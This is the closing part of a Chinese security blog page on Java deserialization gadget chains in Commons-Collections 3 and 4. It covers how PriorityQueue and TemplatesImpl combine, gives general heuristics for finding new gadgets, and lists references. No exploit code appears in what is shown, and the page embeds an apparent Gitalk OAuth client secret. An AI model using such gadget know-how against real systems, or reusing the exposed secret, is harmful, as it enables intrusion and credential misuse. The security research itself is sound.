+<h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>&emsp;&emsp; <code>PriorityQueue</code>原本只是个优先队列，<code>TemplatesImpl</code>原本只是在xalan中的处理xml的模板实现，但是经过大佬之手二者结合产生巨大效果。吾不敢不服，下面只想用一图展现笔者对此gadget的思考。<br><img src="https://img-blog.csdnimg.cn/20200520144825335.png" alt="在这里插入图片描述"></p>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 看完其实不难发现，Java反序列化漏洞必然离不开Java的反射机制的作用。这种都是底层的Java语言的开发者所想到便于开发的机制，下图是oracle官方给出的图例，笔者觉得如果想要打开一个新方向必然会用到一种“新”机制，这种机制应该还是开发人员经常使用的。<br><img src="https://img-blog.csdnimg.cn/20200520151819350.png" alt="在这里插入图片描述"><br>&emsp;&emsp; 一个新的Gadget的产生构造笔者有几点愚见，如有错误还望海涵。</p>
+<ol>
+<li>一个JDK自带的实现<code>Serializabe</code>接口</li>
+<li>必然离不开Java反射机制</li>
+<li>readObject()方法</li>
+</ol>
+<hr>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://tool.oschina.net/apidocs/apidoc?api=commons-collections" target="_blank" rel="noopener">https://tool.oschina.net/apidocs/apidoc?api=commons-collections</a><br><a href="https://paper.seebug.org/1195/" target="_blank" rel="noopener">https://paper.seebug.org/1195/</a><br><a href="http://blog.orleven.com/2017/11/11/java-deserialize/" target="_blank" rel="noopener">http://blog.orleven.com/2017/11/11/java-deserialize/</a><br><a href="https://xz.aliyun.com/t/7031#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/7031#toc-5</a><br><a href="https://blog.csdn.net/chenwan8737/article/details/100716015" target="_blank" rel="noopener">https://blog.csdn.net/chenwan8737/article/details/100716015</a><br><a href="https://blog.csdn.net/weixin_33802505/article/details/92214760" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33802505/article/details/92214760</a><br><a href="https://blog.csdn.net/21aspnet/article/details/81671777" target="_blank" rel="noopener">https://blog.csdn.net/21aspnet/article/details/81671777</a><br><a href="https://xalan.apache.org/xalan-j/apidocs/index.html" target="_blank" rel="noopener">https://xalan.apache.org/xalan-j/apidocs/index.html</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='https://link.hhtjim.com/163/574566207.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='https://link.hhtjim.com/qq/playsong.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='a69212da3fc88cd39af9'
+        data-cs='19e2c5d71620cb7b14d99a908f8134be70bd83fa'
+        data-r='gittalksamny'
+        data-o='samny520'
+        data-a='samny520'
+        data-d='true'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Commons-Collections3"><span class="toc-number">1.</span> <span class="toc-text">Commons-Collections3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#模拟场景DEMO"><span class="toc-number">1.1.</span> <span class="toc-text">模拟场景DEMO</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#创建模拟服务器应用"><span class="toc-number">1.1.1.</span> <span class="toc-text">创建模拟服务器应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用代码"><span class="toc-number">1.1.2.</span> <span class="toc-text">利用代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞效果"><span class="toc-number">1.1.3.</span> <span class="toc-text">漏洞效果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.1.4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞触发流程"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">漏洞触发流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞成因分析"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">漏洞成因分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">1.2.</span> <span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Commons-Collections4"><span class="toc-number">2.</span> <span class="toc-text">Commons-Collections4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞触发流程-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">漏洞触发流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞成因分析-1"><span class="toc-number">2.1.2.</span> <span class="toc-text">漏洞成因分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结-1"><span class="toc-number">2.2.</span> <span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<span id="busuanzi_container_page_pv">
+   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/js/test.js"></script>
+<script src="/js/tx.js"></script>
+<script src="/js/x.js"></script>
+<script src="/js/xiantiao.js"></script>
+<script src="/js/baidu.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- 在想要使用窗口小部件的地方插入该标签 -->
+<iframe width="900" height="401" src="https://cybermap.kaspersky.com/cn/widget/dynamic/dark" frameborder="0">
+
+
+<script type="text/javascript" src="//rf.revolvermaps.com/0/0/6.js?i=5jbaycl6wsf&amp;m=7&amp;c=e63100&amp;cr1=ffffff&amp;f=arial&amp;l=0&amp;bv=90&amp;lx=-420&amp;ly=420&amp;hi=20&amp;he=7&amp;hc=a8ddff&amp;rs=80" async="async"></script>
+
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', '218065278', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+</html>
